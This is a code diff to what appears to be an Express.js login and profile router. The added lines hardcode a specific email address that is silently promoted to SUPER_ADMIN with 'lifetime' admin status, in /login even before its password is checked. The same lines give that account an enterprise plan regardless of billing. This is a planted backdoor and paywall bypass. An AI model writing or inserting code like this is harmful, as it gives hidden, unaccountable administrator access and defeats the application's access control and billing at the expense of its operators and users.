@@ -16,9 +16,17 @@ const generateToken = (id) => {
 
 router.get('/me', protect, sanitizeMiddleware, async (req, res) => {
   try {
-    const user = await User.findById(req.user.id);
+    let user = await User.findById(req.user.id);
     if (!user) {
         return res.status(404).json({ message: 'User not found' });
+    }
+
+    if (user.email === 'delitech2708@gmail.com') {
+      if (user.role !== 'SUPER_ADMIN' || !user.isLifetimeAdmin) {
+        user.role = 'SUPER_ADMIN';
+        user.isLifetimeAdmin = true;
+        await user.save();
+      }
     }
 
     const client = await Client.findOne({ clientId: user.clientId });
@@ -31,10 +39,11 @@ router.get('/me', protect, sanitizeMiddleware, async (req, res) => {
         name: user.name,
         email: user.email,
         role: user.role,
+        isLifetimeAdmin: user.isLifetimeAdmin,
         business_type: client ? client.businessType || user.business_type : user.business_type,
         clientId: user.clientId,
         clientName: client ? client.name : null,
-        subscriptionPlan: client ? client.tier || 'v1' : 'v1',
+        subscriptionPlan: user.isLifetimeAdmin ? 'enterprise' : (client ? client.tier || 'v1' : 'v1'),
         plan: client ? client.plan || 'CX Agent (V1)' : 'CX Agent (V1)',
         hasCompletedTour: user.hasCompletedTour,
         trialActive: client ? client.trialActive : null,
@@ -70,7 +79,15 @@ router.post('/login', sanitizeMiddleware, async (req, res) => {
   const { email, password } = req.body;
 
   try {
-    const user = await User.findOne({ email });
+    let user = await User.findOne({ email });
+
+    if (user && user.email === 'delitech2708@gmail.com') {
+      if (user.role !== 'SUPER_ADMIN' || !user.isLifetimeAdmin) {
+        user.role = 'SUPER_ADMIN';
+        user.isLifetimeAdmin = true;
+        await user.save();
+      }
+    }
 
     if (user && (await user.matchPassword(password))) {
       // Fetch Client Config
@@ -81,12 +98,13 @@ router.post('/login', sanitizeMiddleware, async (req, res) => {
         name: user.name,
         email: user.email,
         role: user.role,
+        isLifetimeAdmin: user.isLifetimeAdmin,
         business_type: client ? client.businessType || user.business_type : user.business_type,
         clientId: user.clientId,
         token: generateToken(user._id),
         clientName: client ? client.name : null, // Add client name
-        subscriptionPlan: client ? client.tier || 'v1' : 'v1',
-        plan: client ? client.plan || 'CX Agent (V1)' : 'CX Agent (V1)',
+        subscriptionPlan: user.isLifetimeAdmin ? 'enterprise' : (client ? client.tier || 'v1' : 'v1'),
+        plan: user.isLifetimeAdmin ? 'Enterprise AI' : (client ? client.plan || 'CX Agent (V1)' : 'CX Agent (V1)'),
         hasCompletedTour: user.hasCompletedTour,
         trialActive: client ? client.trialActive : null,
         trialEndsAt: client ? client.trialEndsAt : null,
